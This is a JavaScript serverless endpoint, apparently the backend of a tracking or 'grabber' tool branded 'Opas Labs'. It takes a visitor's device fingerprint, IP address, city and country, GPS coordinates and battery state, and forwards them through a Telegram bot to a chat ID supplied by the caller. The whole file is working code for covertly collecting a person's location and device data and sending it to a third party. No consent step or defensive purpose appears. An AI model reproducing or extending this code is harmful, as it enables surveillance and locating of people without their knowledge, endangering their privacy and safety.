export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, ...d } = req.body;

    const message = `**🔰 Opas Labs 🔰**\n\n` +
    `🌐 **Basic Info:**\n` +
    `- Browser: ${d.browser}\n` +
    `- Platform: ${d.platform}\n` +
    `- Language: ${d.language}\n` +
    `- Timezone: ${d.timezone}\n\n` +

    `💻 **Hardware:**\n` +
    `- CPU: ${d.cpu}\n` +
    `- RAM: ${d.ram}\n` +
    `- Screen: ${d.screen}\n` +
    `- WebGL: ${d.webgl}\n\n` +

    `📶 **Network:**\n` +
    `- Type: ${d.networkType}\n` +
    `- Speed: ${d.networkSpeed}\n` +
    `- Latency: ${d.latency}\n` +
    `- Data Saver: ${d.dataSaver}\n\n` +

    `📍 **IP Info:**\n` +
    `- IP: ${d.ip}\n` +
    `- City: ${d.location.city}\n` +
    `- Region: ${d.location.region}\n` +
    `- Country: ${d.location.country}\n` +
    `- GPS: ${d.gps}\n\n` +
    `"_Note: IP-based location may not be accurate._"\n\n` +

    `🔋 **Battery:**\n` +
    `- Level: ${d.batteryLevel}\n` +
    `- Charging: ${d.charging}`;

    // Send message to Telegram
    await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: telegramId,
          text: message,
          parse_mode: 'Markdown'
        })
      }
    );

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Submit Error:', error);
    res.status(500).json({ error: error.message || 'Failed to send to Telegram' });
  }
};
